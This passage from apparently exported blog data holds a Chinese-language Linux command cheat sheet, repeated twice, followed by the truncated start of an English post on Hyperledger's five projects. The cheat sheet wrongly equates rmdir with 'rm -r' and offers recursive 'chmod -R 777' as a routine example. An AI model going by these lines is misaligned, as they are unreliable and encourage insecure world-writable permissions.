软连接：也称为符号连接，即为文件或目录创建一个快捷方式。</span><br><span class=\"line\">硬链接：给一个文件取多于一个名字，放在不同目录中，方便用户使用。</span><br><span class=\"line\"> </span><br><span class=\"line\">Ln命令参数如下：</span><br><span class=\"line\">   -f：在创建连接时，先将与目的对象同名的文件或目录删除。</span><br><span class=\"line\">   -d：允许系统管理者硬链接自己的目录。</span><br><span class=\"line\">   -i：在删除与目的对象同名文件或目录时先询问用户。</span><br><span class=\"line\">   -n：在创建软连接时，将目的对象视为一般的文件。</span><br><span class=\"line\">   -s：创建软连接，即符号连接。</span><br><span class=\"line\">   -v：在连接之前显示文件或目录名。</span><br><span class=\"line\">   -b：将在连接时会被覆盖或删除的文件进行备份。</span><br><span class=\"line\"> </span><br><span class=\"line\">帮助命令-----man</span><br><span class=\"line\">其他命令</span><br><span class=\"line\">   Who：显示系统中有那些用户在使用。</span><br><span class=\"line\">        -ami  显示当前用户</span><br><span class=\"line\">        -u：显示使用者的动作/工作</span><br><span class=\"line\">        -s：使用简短的格式来显示</span><br><span class=\"line\">        -v：显示程序版本</span><br><span class=\"line\">   Free：查看当前系统的内存使用情况</span><br><span class=\"line\">   Uptime：显示系统运行了多长时间</span><br><span class=\"line\">   Ps：显示瞬间进程的动态</span><br><span class=\"line\">   Top: 动态地显示进程</span><br><span class=\"line\">   Pstree：以树状方式显示系统中所有的进程</span><br><span class=\"line\">   Date：显示或设定系统的日期与时间。</span><br><span class=\"line\">   Last：显示每月登陆系统的用户信息</span><br><span class=\"line\">   Kill： 杀死一些特定的进程</span><br><span class=\"line\">   Logout：退出系统</span><br><span class=\"line\">   Useradd/userdel:添加用户/删除用户</span><br><span class=\"line\">   Clear：清屏</span><br><span class=\"line\">   Passwd：设置用户密码</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">vi编辑器</span><br><span class=\"line\">   首先用vi命令打开一个文件</span><br><span class=\"line\">末行模式命令：</span><br><span class=\"line\">   :n,m w path/filename 保存指定范围文档（ n表开始行，m表结束行）</span><br><span class=\"line\">   :q!    对文件做过修改后，强制退出</span><br><span class=\"line\">   :q     没有对文件做过修改退出</span><br><span class=\"line\">   Wq或x  保存退出</span><br><span class=\"line\">   dd   删除光标所在行</span><br><span class=\"line\">   ： set number 显示行号</span><br><span class=\"line\">   ：n 跳转到n行</span><br><span class=\"line\">   ：s  替换字符串 :s/test/test2/g  /g全局替换 /也可以用%代替</span><br><span class=\"line\">   / 查找字符串</span><br><span class=\"line\"> </span><br><span class=\"line\">网络通信常用的命令</span><br><span class=\"line\">   Arp：网络地址显示及控制</span><br><span class=\"line\">   ftp：文件传输</span><br><span class=\"line\">   Lftp：文件传输</span><br><span class=\"line\">   Mail：发送/接收电子邮件</span><br><span class=\"line\">   Mesg：允许或拒绝其他用户向自己所用的终端发送信息</span><br><span class=\"line\">   Mutt E-mail 管理程序</span><br><span class=\"line\">   Ncftp ：文件传输</span><br><span class=\"line\">   Netstat：显示网络连接.路由表和网络接口信息</span><br><span class=\"line\">   Pine：收发电子邮件，浏览新闻组</span><br><span class=\"line\">   Ping：用于查看网络是否连接通畅</span><br><span class=\"line\">   Ssh：安全模式下远程登陆</span><br><span class=\"line\">   Telnet：远程登录</span><br><span class=\"line\">   Talk：与另一用户对话</span><br><span class=\"line\">   Traceroute：显示到达某一主机所经由的路径及所使用的时间。</span><br><span class=\"line\">   Wget：从网路上自动下载文件</span><br><span class=\"line\">   Write：向其它用户终端写信息    Rlogin：远程登录</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">如今出去面试多少都会被问及个linux的问题， 而且项目进uat后也都要发到linux下， 所以知道几个linux命令是必要的。</span><br><span class=\"line\"> 第一个，也是最有用的一个：</span><br><span class=\"line\">man 察看命令详解,只要觉得哪个命令不清楚，man它就可以了.</span><br><span class=\"line\">   man ls</span><br><span class=\"line\"> ln 创建链接文件</span><br><span class=\"line\">  ln -s sourceName destName</span><br><span class=\"line\"> ls 列出文件  -l: 逐行显示且列出详细属性  -a: 列出所有文件包括以.开头的隐藏文件</span><br><span class=\"line\">  ls -lqt /bin</span><br><span class=\"line\">cat 读取文本内容</span><br><span class=\"line\">  -n: 显示行号  -b: 显示行号且忽略空行</span><br><span class=\"line\">  cat -n 1.txt</span><br><span class=\"line\"> </span><br><span class=\"line\">wc: 计数  -l: 行数  -w: 字数  -c: 字符数  wc -l file1 file2 ......可以统计多个文件</span><br><span class=\"line\"> </span><br><span class=\"line\">cp 拷贝文件 目录  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 拷贝目录  cp file1 file2 file3.... dir 表示将file1,file2...拷贝到dir  cp -r dir1 dir2 dir3... dirn 将dir1, dir2,dir3...拷贝到dirn</span><br><span class=\"line\"> </span><br><span class=\"line\">file 察看文件类型</span><br><span class=\"line\">  file test.sh</span><br><span class=\"line\"> </span><br><span class=\"line\">mv 移动文件，更改文件名  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 移动目录，跟改目录名</span><br><span class=\"line\"> </span><br><span class=\"line\">rm 删除文件</span><br><span class=\"line\">  -i: 交互模式，询问是否删除  rm -r dir1 dir2 dir3...可删除多个</span><br><span class=\"line\"> </span><br><span class=\"line\">mkdir 创建目录  -p: parent,父目录不存在，则创建父目录</span><br><span class=\"line\">  mkdir -p test/test</span><br><span class=\"line\"> </span><br><span class=\"line\">rmdir 删除目录  等同与rm -r  rmdir dir1 dir2 dir3 ....  rm -r dir1 dir2 dir3 ....</span><br><span class=\"line\">chmod 更改权限  chmod -R 777 DIR改变目录下所有文件权限为777，必须是-R</span><br><span class=\"line\"> 权限 -rwxrwxrwx         421421421  最前面的-表示文件类型为普通文件  接下来三位表示所有者权限  接下来三位表示组权限  最后三位表示其它用户权限  如果某一权限没有被分配，用-表示。-rwxr--rwx表示组没有写和执行权限  文件加夜有可执行权限，但表示是否容许在该目录下寻找文件</span><br><span class=\"line\">chown 改变所有者</span><br><span class=\"line\"></span><br><span class=\"line\">chgrp 改变组</span><br><span class=\"line\"></span><br><span class=\"line\">command &amp;  命令后面加&amp;表示在后台运行  find . -name &quot;*.sh&quot;&amp;</span><br><span class=\"line\">fg 把后台进程放到前台  fg %1 把后台第一个作业放到前台</span><br><span class=\"line\">bg  把前台进程放到后台</span><br><span class=\"line\">jobs  显示后台或挂起的进程</span><br><span class=\"line\">ps   显示所有进程  ps -f 显示完全信息，包括占用cpu时间，开始时间。。。</span><br><span class=\"line\">kill  -9 强制结束   more 显示文本内容，每次一屏，按空格继续  find / -name &quot;*.sh&quot; | more</span><br><span class=\"line\">tail 从指定的位置开始显示后面得内容  tail -f server.log 用于在server上边运行边察看日志  tail -10 dos2unix.sh 察看最后10行</span><br><span class=\"line\">head  与tail对应</span><br><span class=\"line\">sort 排序  -r 逆序  -d 字典顺序  ls | sort -r</span><br><span class=\"line\">tr  字符替换</span><br><span class=\"line\">  -d 删除指定字符  ls | tr -d &apos;log&apos;  ls | tr &apos;d&apos; &apos;g&apos;把d变成g</span><br><span class=\"line\">at time date job  定时调度</span><br><span class=\"line\">compress  -f 压缩文件  -v 显示压缩比例  compress -vf project.tar 将产生project.tar.Z且project.tar被删除</span><br><span class=\"line\">uncompress  -f 解压缩文件  -v 显示压缩比例  uncompress project.tar.Z 将产生project.tar且project.tar.Z被删除  tar  -c 创建新文档  -x 解包  -v 显示正在处理的文件名  -f 取代默认的文件名  tar -cvf project.tar project/* 把project目录下所有文件打包  tar -xvf project.tar</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> crontab </span><br><span class=\"line\">　　使用权限 : 所有使用者 </span><br><span class=\"line\">　　</span><br><span class=\"line\">　　使用方式 : </span><br><span class=\"line\">　　</span><br><span class=\"line\">　　crontab [ -u user ] file </span><br><span class=\"line\">　　crontab [ -u user ] &#123; -l | -r | -e &#125; </span><br><span class=\"line\">　　</span><br><span class=\"line\"></span><br><span class=\"line\">　　crontab   指定使用者在固定时间执行程序，换句话说，即使用者的时程表。-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找超过10M的文件</span><br><span class=\"line\"></span><br><span class=\"line\">\tfind &lt;PATH &gt;-size +10M</span><br><span class=\"line\"></span><br><span class=\"line\">Find the files which modified since 120 days before</span><br><span class=\"line\"></span><br><span class=\"line\">\tfind ./ -mtime +120</span><br><span class=\"line\"></span><br><span class=\"line\">Find the file haven’t been visited within 90days</span><br><span class=\"line\"></span><br><span class=\"line\">\tfind ./ \\! -atime -90</span><br><span class=\"line\"></span><br><span class=\"line\">at命令用来安排一个程序在未来的做一次一次性执行。所有提交的任务都被放在 /var/spool/at 目录下并且到了执行时间的时候通过atd守护进程来执行。</span><br><span class=\"line\"></span><br><span class=\"line\">lspci命令用来显示你的系统上PCI总线和附加设备的信息。指定-v，-vv或-vvv来获取越来越详细的输出，加上-r参数的话，命令的输出则会更具有易读性。</span><br><span class=\"line\"></span><br><span class=\"line\">显示目录和文件的命令</span><br><span class=\"line\">   Ls：用于查看所有文件夹的命令。</span><br><span class=\"line\">   Dir：用于显示指定文件夹和目录的命令   Tree： 以树状图列出目录内容</span><br><span class=\"line\">   Du：显示目录或文件大小 </span><br><span class=\"line\"> </span><br><span class=\"line\">修改目录，文件权限和属主及数组命令</span><br><span class=\"line\">   Chmod：用于改变指定文件的权限命令。</span><br><span class=\"line\">   Chown：用于改变文件拥有属性的命令。</span><br><span class=\"line\">   Chgrp：用于改变文件群组的命令。</span><br><span class=\"line\">   Chattr：用于设置文件具有不可删除和修改权限。</span><br><span class=\"line\">   Lsattr：用于显示文件或目录的隐藏属性。</span><br><span class=\"line\"> </span><br><span class=\"line\">创建和删除目录的命令</span><br><span class=\"line\">   Mkdir：用于创建目录</span><br><span class=\"line\">   Rmdir：用于删除空的目录</span><br><span class=\"line\">   Rm -f：用于删除不为空的目录</span><br><span class=\"line\"> </span><br><span class=\"line\">创建和删除，重命名，复制文件的命令</span><br><span class=\"line\">  Touch：创建一个新的文件</span><br><span class=\"line\">   Vi:创建一个新的文件</span><br><span class=\"line\">   Rm：删除文件或目录</span><br><span class=\"line\">   Mv：重命名或移动文件的命令</span><br><span class=\"line\">   Cp：复制命令</span><br><span class=\"line\"></span><br><span class=\"line\"> </span><br><span class=\"line\">显示文件内容的命令</span><br><span class=\"line\">   Cat：用于显示指定文件的全部内容</span><br><span class=\"line\">   More：用分页的形式显示指定文件的内容</span><br><span class=\"line\">   Less：用分页的形式显示指定文件的内容，区别是more和less翻页使用的操作键不同。</span><br><span class=\"line\">   Head：用于显示文件的前n行内容。</span><br><span class=\"line\">   Tail：用于显示文件的后n行内容。</span><br><span class=\"line\">   Tail -f：用于自动刷新的显示文件后n行数据内容。</span><br><span class=\"line\"> </span><br><span class=\"line\">查找命令</span><br><span class=\"line\">   Find：查找指定的文件。</span><br><span class=\"line\">   Whereis：查找指定的文件源和二进制文件和手册等</span><br><span class=\"line\">   Which：用于查询命令或别名的位置。</span><br><span class=\"line\">   Locate：快速查找系统数据库中指定的内容。</span><br><span class=\"line\">   Grep：查找文件里符合条件的字符串。</span><br><span class=\"line\"> </span><br><span class=\"line\">关机和重启计算机的命令</span><br><span class=\"line\">     </span><br><span class=\"line\">   Shutdown：-r 关机后立即重启</span><br><span class=\"line\">             -k 并不真正的关机，而只是发出警告信息给所有用户</span><br><span class=\"line\">             -h 关机后不重新启动</span><br><span class=\"line\">   Poweroff：用于关机和关闭电源</span><br><span class=\"line\">   Init：改变系统运行级别</span><br><span class=\"line\">        0级用于关闭系统</span><br><span class=\"line\">        1 级用于单一使用者模式</span><br><span class=\"line\">        2级用来进行多用户使用模式（但不带网络功能）</span><br><span class=\"line\">        3级用来进行多用户使用模式（带网络全功能）</span><br><span class=\"line\">        4级用来进行用户自定义使用模式</span><br><span class=\"line\">        5级表示进入x  windows时的模式</span><br><span class=\"line\">        6级用来重启系统</span><br><span class=\"line\">   Reboot： 用于计算机重启</span><br><span class=\"line\">   Halt：用于关闭计算机系统</span><br><span class=\"line\"> </span><br><span class=\"line\">压缩和打包命令</span><br><span class=\"line\">   Tar：用于多个文件或目录进行打包，但不压缩，同时也用命令进行解包</span><br><span class=\"line\">   Gzip：用于文件进行压缩和解压缩命令，文件扩展名为.gz结尾。</span><br><span class=\"line\">   Gunzip：用于对gzip压缩文档进行解压缩。</span><br><span class=\"line\">   Bzip2：用于对文件或目录进行压缩和解压缩</span><br><span class=\"line\">   Bzcat：用于显示压缩文件的内容。</span><br><span class=\"line\">   Compress/un compress： 压缩/解压缩.Z文件</span><br><span class=\"line\">   Zcat：查看z或gz结尾的压缩文件内容。</span><br><span class=\"line\">   Gzexe：压缩可执行的文件</span><br><span class=\"line\">   Unarg：解压缩.arj文件</span><br><span class=\"line\">   Zip/unzip:压缩解压缩.zip文件</span><br><span class=\"line\"> </span><br><span class=\"line\">用户操作命令</span><br><span class=\"line\">   Su：切换用户命令</span><br><span class=\"line\">   Sudo：一系统管理员的身份执行命令</span><br><span class=\"line\">   Passwd：用于修改用户的密码</span><br><span class=\"line\"> </span><br><span class=\"line\">改变目录和查看当前目录命令</span><br><span class=\"line\">   Cd：进入工作目录</span><br><span class=\"line\">   Cd 。。：会退到上一级命令</span><br><span class=\"line\">   Pwd：显示当前用户所在工作目录位置</span><br><span class=\"line\"> </span><br><span class=\"line\">文件连接命令</span><br><span class=\"line\">   Ln：为源文件创建一个连接，并不将源文件复制一份，即占用的空间很小。</span><br><span class=\"line\">        可以分为软件连接和硬链接。</span><br><span class=\"line\">        软连接：也称为符号连接，即为文件或目录创建一个快捷方式。</span><br><span class=\"line\">硬链接：给一个文件取多于一个名字，放在不同目录中，方便用户使用。</span><br><span class=\"line\"> </span><br><span class=\"line\">Ln命令参数如下：</span><br><span class=\"line\">   -f：在创建连接时，先将与目的对象同名的文件或目录删除。</span><br><span class=\"line\">   -d：允许系统管理者硬链接自己的目录。</span><br><span class=\"line\">   -i：在删除与目的对象同名文件或目录时先询问用户。</span><br><span class=\"line\">   -n：在创建软连接时，将目的对象视为一般的文件。</span><br><span class=\"line\">   -s：创建软连接，即符号连接。</span><br><span class=\"line\">   -v：在连接之前显示文件或目录名。</span><br><span class=\"line\">   -b：将在连接时会被覆盖或删除的文件进行备份。</span><br><span class=\"line\"> </span><br><span class=\"line\">帮助命令-----man</span><br><span class=\"line\">其他命令</span><br><span class=\"line\">   Who：显示系统中有那些用户在使用。</span><br><span class=\"line\">        -ami  显示当前用户</span><br><span class=\"line\">        -u：显示使用者的动作/工作</span><br><span class=\"line\">        -s：使用简短的格式来显示</span><br><span class=\"line\">        -v：显示程序版本</span><br><span class=\"line\">   Free：查看当前系统的内存使用情况</span><br><span class=\"line\">   Uptime：显示系统运行了多长时间</span><br><span class=\"line\">   Ps：显示瞬间进程的动态</span><br><span class=\"line\">   Top: 动态地显示进程</span><br><span class=\"line\">   Pstree：以树状方式显示系统中所有的进程</span><br><span class=\"line\">   Date：显示或设定系统的日期与时间。</span><br><span class=\"line\">   Last：显示每月登陆系统的用户信息</span><br><span class=\"line\">   Kill： 杀死一些特定的进程</span><br><span class=\"line\">   Logout：退出系统</span><br><span class=\"line\">   Useradd/userdel:添加用户/删除用户</span><br><span class=\"line\">   Clear：清屏</span><br><span class=\"line\">   Passwd：设置用户密码</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">vi编辑器</span><br><span class=\"line\">   首先用vi命令打开一个文件</span><br><span class=\"line\">末行模式命令：</span><br><span class=\"line\">   :n,m w path/filename 保存指定范围文档（ n表开始行，m表结束行）</span><br><span class=\"line\">   :q!    对文件做过修改后，强制退出</span><br><span class=\"line\">   :q     没有对文件做过修改退出</span><br><span class=\"line\">   Wq或x  保存退出</span><br><span class=\"line\">   dd   删除光标所在行</span><br><span class=\"line\">   ： set number 显示行号</span><br><span class=\"line\">   ：n 跳转到n行</span><br><span class=\"line\">   ：s  替换字符串 :s/test/test2/g  /g全局替换 /也可以用%代替</span><br><span class=\"line\">   / 查找字符串</span><br><span class=\"line\"> </span><br><span class=\"line\">网络通信常用的命令</span><br><span class=\"line\">   Arp：网络地址显示及控制</span><br><span class=\"line\">   ftp：文件传输</span><br><span class=\"line\">   Lftp：文件传输</span><br><span class=\"line\">   Mail：发送/接收电子邮件</span><br><span class=\"line\">   Mesg：允许或拒绝其他用户向自己所用的终端发送信息</span><br><span class=\"line\">   Mutt E-mail 管理程序</span><br><span class=\"line\">   Ncftp ：文件传输</span><br><span class=\"line\">   Netstat：显示网络连接.路由表和网络接口信息</span><br><span class=\"line\">   Pine：收发电子邮件，浏览新闻组</span><br><span class=\"line\">   Ping：用于查看网络是否连接通畅</span><br><span class=\"line\">   Ssh：安全模式下远程登陆</span><br><span class=\"line\">   Telnet：远程登录</span><br><span class=\"line\">   Talk：与另一用户对话</span><br><span class=\"line\">   Traceroute：显示到达某一主机所经由的路径及所使用的时间。</span><br><span class=\"line\">   Wget：从网路上自动下载文件</span><br><span class=\"line\">   Write：向其它用户终端写信息    Rlogin：远程登录</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">如今出去面试多少都会被问及个linux的问题， 而且项目进uat后也都要发到linux下， 所以知道几个linux命令是必要的。</span><br><span class=\"line\"> 第一个，也是最有用的一个：</span><br><span class=\"line\">man 察看命令详解,只要觉得哪个命令不清楚，man它就可以了.</span><br><span class=\"line\">   man ls</span><br><span class=\"line\"> ln 创建链接文件</span><br><span class=\"line\">  ln -s sourceName destName</span><br><span class=\"line\"> ls 列出文件  -l: 逐行显示且列出详细属性  -a: 列出所有文件包括以.开头的隐藏文件</span><br><span class=\"line\">  ls -lqt /bin</span><br><span class=\"line\">cat 读取文本内容</span><br><span class=\"line\">  -n: 显示行号  -b: 显示行号且忽略空行</span><br><span class=\"line\">  cat -n 1.txt</span><br><span class=\"line\"> </span><br><span class=\"line\">wc: 计数  -l: 行数  -w: 字数  -c: 字符数  wc -l file1 file2 ......可以统计多个文件</span><br><span class=\"line\"> </span><br><span class=\"line\">cp 拷贝文件 目录  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 拷贝目录  cp file1 file2 file3.... dir 表示将file1,file2...拷贝到dir  cp -r dir1 dir2 dir3... dirn 将dir1, dir2,dir3...拷贝到dirn</span><br><span class=\"line\"> </span><br><span class=\"line\">file 察看文件类型</span><br><span class=\"line\">  file test.sh</span><br><span class=\"line\"> </span><br><span class=\"line\">mv 移动文件，更改文件名  -i: 交互模式，如果目标文件存在，则询问是否覆盖  -r: 移动目录，跟改目录名</span><br><span class=\"line\"> </span><br><span class=\"line\">rm 删除文件</span><br><span class=\"line\">  -i: 交互模式，询问是否删除  rm -r dir1 dir2 dir3...可删除多个</span><br><span class=\"line\"> </span><br><span class=\"line\">mkdir 创建目录  -p: parent,父目录不存在，则创建父目录</span><br><span class=\"line\">  mkdir -p test/test</span><br><span class=\"line\"> </span><br><span class=\"line\">rmdir 删除目录  等同与rm -r  rmdir dir1 dir2 dir3 ....  rm -r dir1 dir2 dir3 ....</span><br><span class=\"line\">chmod 更改权限  chmod -R 777 DIR改变目录下所有文件权限为777，必须是-R</span><br><span class=\"line\"> 权限 -rwxrwxrwx         421421421  最前面的-表示文件类型为普通文件  接下来三位表示所有者权限  接下来三位表示组权限  最后三位表示其它用户权限  如果某一权限没有被分配，用-表示。-rwxr--rwx表示组没有写和执行权限  文件加夜有可执行权限，但表示是否容许在该目录下寻找文件</span><br><span class=\"line\">chown 改变所有者</span><br><span class=\"line\"></span><br><span class=\"line\">chgrp 改变组</span><br><span class=\"line\"></span><br><span class=\"line\">command &amp;  命令后面加&amp;表示在后台运行  find . -name &quot;*.sh&quot;&amp;</span><br><span class=\"line\">fg 把后台进程放到前台  fg %1 把后台第一个作业放到前台</span><br><span class=\"line\">bg  把前台进程放到后台</span><br><span class=\"line\">jobs  显示后台或挂起的进程</span><br><span class=\"line\">ps   显示所有进程  ps -f 显示完全信息，包括占用cpu时间，开始时间。。。</span><br><span class=\"line\">kill  -9 强制结束   more 显示文本内容，每次一屏，按空格继续  find / -name &quot;*.sh&quot; | more</span><br><span class=\"line\">tail 从指定的位置开始显示后面得内容  tail -f server.log 用于在server上边运行边察看日志  tail -10 dos2unix.sh 察看最后10行</span><br><span class=\"line\">head  与tail对应</span><br><span class=\"line\">sort 排序  -r 逆序  -d 字典顺序  ls | sort -r</span><br><span class=\"line\">tr  字符替换</span><br><span class=\"line\">  -d 删除指定字符  ls | tr -d &apos;log&apos;  ls | tr &apos;d&apos; &apos;g&apos;把d变成g</span><br><span class=\"line\">at time date job  定时调度</span><br><span class=\"line\">compress  -f 压缩文件  -v 显示压缩比例  compress -vf project.tar 将产生project.tar.Z且project.tar被删除</span><br><span class=\"line\">uncompress  -f 解压缩文件  -v 显示压缩比例  uncompress project.tar.Z 将产生project.tar且project.tar.Z被删除  tar  -c 创建新文档  -x 解包  -v 显示正在处理的文件名  -f 取代默认的文件名  tar -cvf project.tar project/* 把project目录下所有文件打包  tar -xvf project.tar</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"> crontab </span><br><span class=\"line\">　　使用权限 : 所有使用者 </span><br><span class=\"line\">　　</span><br><span class=\"line\">　　使用方式 : </span><br><span class=\"line\">　　</span><br><span class=\"line\">　　crontab [ -u user ] file </span><br><span class=\"line\">　　crontab [ -u user ] &#123; -l | -r | -e &#125; </span><br><span class=\"line\">　　</span><br><span class=\"line\"></span><br><span class=\"line\">　　crontab   指定使用者在固定时间执行程序，换句话说，即使用者的时程表。-u user 是指设定指定 user 的时程表，这个前提是你必须要有其权限(比如说是 root)才能够指定他人的时程表。如果不使用 -u user 的话，就是表示设定自己的时程表。</span><br></pre></td></tr></table></figure>"},{"layout":"title","title":"Different between 5 Hyperleder project","date":"2018-02-10T21:45:42.000Z","_content":"The Linux Foundation’s Hyperledger project, which is focused on open source blockchain technology, divides its work into five sub projects. Hyperledger Executive Director Brian Behlendorf said Hyperledger’s technical steering committee must approve each new sub project, and it’s looking for projects that “represent different thinking.”\n\nThe first five projects are: Fabric, Sawtooth, Indy, Burrow, and Iroha.\n\n“Every one of these projects started life outside of Hyperledger, first, by a team that had certain use cases in mind,” said Behlendorf. Each project must bring something unique to the open source group, and its technology must be applicable to other companies.\n\n### Fabric\nFabric is Hyperledger’s most active project to date. The Fabric 1.0 release was issued in July. IBM initiated the Fabric project. It’s intended as a foundation for developing blockchain distributed ledger applications with a modular architecture. It allows components, such as consensus and membership services, to be plug-and-play.\n\n“Fabric is the granddaddy, if you will,” said Behlendorf. “Several companies are already selling products and services based on it.” The core of the platform is written in the Go programming language. A unique characteristic of Fabric is that its distributed ledger and smart contract platform allows for private channels. “If you have a large blockchain network and you want to share data with only certain parties, you can create a private channel with just those participants,” Behlendorf said. “It’s the most distinctive thing about Fabric right now.”\n\n### Sawtooth\nThe Sawtooth project originally came from Intel. It includes a novel consensus algorithm called Proof of Elapsed Time. Consensus is a critical element of all blockchains. Generally, it is the technique by which new information is reviewed and confirmed before being accepted as the next entry in the ledger.\n\nThe Sawtooth consensus software targets large distributed validator populations with minimal 